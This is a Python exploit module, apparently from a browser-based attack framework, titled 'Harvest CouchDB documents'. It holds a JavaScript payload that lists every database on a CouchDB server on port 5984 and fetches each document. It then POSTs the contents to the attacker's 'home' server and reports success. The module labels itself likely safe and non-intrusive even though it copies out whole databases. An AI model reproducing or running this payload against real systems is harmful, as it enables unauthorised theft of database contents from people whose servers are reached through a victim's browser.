#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.

from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Harvest CouchDB documents',
            'Description': """
            """,
            'Options': [],
            'Ports': [5984],
            'classification': (Safety.LIKELY_SAFE, Intrusiveness.NONE),
            'products':[
                {"product":"CouchDB REST httpd"},
                {"product":"CouchDB httpd"}
            ]
        })

    def exploit_code(self, payload):
        data = """
var home = ${HOME};
var modid = ${MODID};
function got_doc(xhr, method, resource, data, user, pass)   {
    var paths = resource.split("/");
    var db = paths[1];
    var doc_paths = paths.slice(2);
    var doc = doc_paths.join("_");
    var data = Misc.parse_network2default(xhr, {});
    var send = {};
    send[db] = {};
    send[db][doc] = data;

    Network.request("POST", home + "/store/json/" + document.domain + "/" + modid, JSON.stringify(send), Misc.empty);
}

function got_docs(xhr, method, resource, data, user, pass)   {
    var db = resource.split("/")[1];
    var data = Misc.parse_network2default(xhr, {"rows":[]});

    for(var i = 0; i < data["rows"].length; i++)    {
        var resource = "/" + db + "/" + data["rows"][i]["key"];
        Network.request_advanced("GET", resource, null, got_doc);
    }
}
function got_dbs(xhr, method, resource, data, user, pass)   {
    var items = Misc.parse_network2default(xhr, []);
    for(var i = 0; i < items.length; i++)   {
        Network.request_advanced("GET", "/" + items[i] + "/_all_docs", null, got_docs);
    }
    // Might be out-of-order, but that is OK since we don't store any data used by other modules
    Network.request("POST", home + "/module/finished/" + document.domain + "/" + modid + "/success", null, Misc.empty);
}
Network.request_advanced("GET", "/_all_dbs", null, got_dbs);"""
        return data
